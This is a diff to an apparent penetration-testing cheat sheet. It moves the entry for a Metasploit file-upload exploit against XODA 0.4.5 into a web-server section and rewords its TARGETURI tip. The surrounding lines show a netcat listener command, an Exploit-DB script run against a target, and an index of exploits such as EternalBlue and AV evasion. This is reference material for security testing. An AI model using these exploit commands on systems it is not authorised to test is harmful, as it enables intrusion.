@@ -454,6 +454,7 @@ set CMD <command>
   - [Apache Tomcat 8.5.19](#Apache-Tomcat-8519)
   - [BadBlue httpd 2.7](#BadBlue-httpd-27)
   - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
+  - [XODA 0.4.5](#XODA-045)
 - SMB/Samba
   - [EternalBlue](#EternalBlue)
   - [Samba smbd 3.X - 4.X](#Samba-smbd-3X---4X)
@@ -463,7 +464,6 @@ set CMD <command>
   - [libssh v0.6.0-0.8.0](#libssh-v060-080)
 - [WinRM](#WinRM)
 - Others
-  - [XODA 0.4.5](#XODA-045)
   - [Exploit Database Binary Exploits](#Exploit-Database-Binary-Exploits)
 - [ARP Poisoning](#ARP-Poisoning)
 - [AV Evasion and Obfuscation](#AV-Evasion-and-Obfuscation)
@@ -533,6 +533,13 @@ nc -nvlp <port>
 python 39161.py <ip> <port>
 ```
 
+### XODA 0.4.5
+[<< Index](#Index)
+```
+use exploit/unix/webapp/xoda_file_upload
+```
+- Change `TARGETURI` i.e. if XODA is running from the `/` directory instead of `/xoda/`.
+
 ## SMB/Samba
 ### EternalBlue
 [<< Index](#Index)
@@ -580,13 +587,6 @@ set FORCE_VBS true
 - Needs credentials.
 
 ## Others
-### XODA 0.4.5
-[<< Index](#Index)
-```
-use exploit/unix/webapp/xoda_file_upload
-```
-- Set `TARGETURI` accordingly.
-
 ### Exploit Database Binary Exploits
 [<< Index](#Index)
 - https://gitlab.com/exploit-database/exploitdb-bin-sploits
